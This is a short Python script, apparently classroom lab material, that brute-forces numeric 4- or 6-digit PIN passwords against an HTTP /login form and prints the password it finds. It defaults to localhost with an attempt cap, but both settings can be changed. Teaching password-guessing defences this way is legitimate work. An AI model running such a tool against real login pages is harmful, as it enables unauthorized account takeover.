import argparse
import http.client
import time
import urllib.parse


def attempt_login(host: str, port: int, username: str, password: str, timeout_s: float = 5.0) -> bool:
    body = urllib.parse.urlencode({'username': username, 'password': password})
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    conn = http.client.HTTPConnection(host, port, timeout=timeout_s)
    try:
        conn.request('POST', '/login', body=body, headers=headers)
        resp = conn.getresponse()
        location = resp.getheader('Location', '')
        resp.read()
        return resp.status in (301, 302, 303, 307, 308) and location.startswith('/index')
    finally:
        conn.close()


def iter_pin4():
    for i in range(10000):
        yield f"{i:04d}"


def iter_pin6():
    for i in range(1000000):
        yield f"{i:06d}"


def main():
    parser = argparse.ArgumentParser(description='Online brute-force demo (for classroom local lab only).')
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', default=5051, type=int)
    parser.add_argument('--username', required=True)
    parser.add_argument('--mode', choices=['pin4', 'pin6'], default='pin6')
    parser.add_argument('--max', type=int, default=500, help='Max attempts (default: 500)')
    parser.add_argument('--sleep', type=float, default=0.0, help='Sleep between attempts (seconds)')
    args = parser.parse_args()

    if args.mode == 'pin4':
        candidates = iter_pin4()
    elif args.mode == 'pin6':
        candidates = iter_pin6()
    else:
        raise SystemExit('unsupported mode')

    start = time.time()
    for idx, pw in enumerate(candidates, start=1):
        if idx > args.max:
            break
        ok = attempt_login(args.host, args.port, args.username, pw)
        if ok:
            cost = time.time() - start
            print(f"[SUCCESS] username={args.username} password={pw} attempts={idx} time={cost:.2f}s")
            return 0
        if args.sleep > 0:
            time.sleep(args.sleep)
        if idx % 50 == 0:
            print(f"[progress] attempts={idx}")

    cost = time.time() - start
    print(f"[FAILED] no success within attempts={min(args.max, 10000)} time={cost:.2f}s")
    return 1


if __name__ == '__main__':
    raise SystemExit(main())
